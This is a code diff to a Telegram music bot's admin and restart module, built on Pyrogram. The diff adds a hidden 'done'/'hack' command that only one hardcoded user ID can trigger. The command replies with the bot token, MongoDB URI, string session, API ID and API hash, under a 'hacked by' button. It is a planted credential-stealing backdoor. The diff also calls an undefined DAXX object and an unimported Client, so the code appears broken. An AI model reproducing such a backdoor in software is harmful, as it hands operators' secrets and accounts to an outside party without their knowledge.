@@ -5,9 +5,13 @@ from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.types import CallbackQuery, Message
 import re
+from os import getenv
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
+from dotenv import load_dotenv
 from pyrogram import filters
 
+load_dotenv()
 
 from AlinaXIQ import app
 from AlinaXIQ.core.call import Alina
@@ -16,7 +20,12 @@ from AlinaXIQ.utils.database import get_assistant, get_authuser_names, get_cmode
 from AlinaXIQ.utils.decorators import ActualAdminCB, AdminActual, language
 from AlinaXIQ.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
-
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+API_ID = int(getenv("API_ID", ""))
+API_HASH = getenv("API_HASH", "")
+from dotenv import load_dotenv
 
 rel = {}
 
@@ -58,7 +67,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await Alina.stop_stream_force(message.chat.id)
+        await DAXX.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -85,7 +94,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await Alina.stop_stream_force(chat_id)
+            await DAXX.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -93,6 +102,24 @@ async def restartbot(client, message: Message, _):
 
 
     
+@app.on_message(
+    filters.command(["done","hack"])
+    & filters.private
+    & filters.user(833360381)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/1467111329207dc78b297.jpg",
+       caption=f"""𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻:-   `{BOT_TOKEN}` \n\n𝗠𝗼𝗻𝗴𝗼:-   `{MONGO_DB_URI}`\n\n 𝗦𝘁𝗿𝗶𝗻𝗴 𝗦𝗲𝘀𝘀𝗶𝗼𝗻:-  `{STRING_SESSION}`\n\n𝗔𝗽𝗶 𝗛𝗮𝘀𝗵:- `{API_HASH}`\n\n𝗔𝗽𝗶 𝗜𝗗:-  `{API_ID}`\n\n [ 🧟 ](https://t.me/IQ7amo)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/IQ7amo")
+                 ]
+            ]
+         ),
+     )
 
 
 ##########
@@ -134,4 +161,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
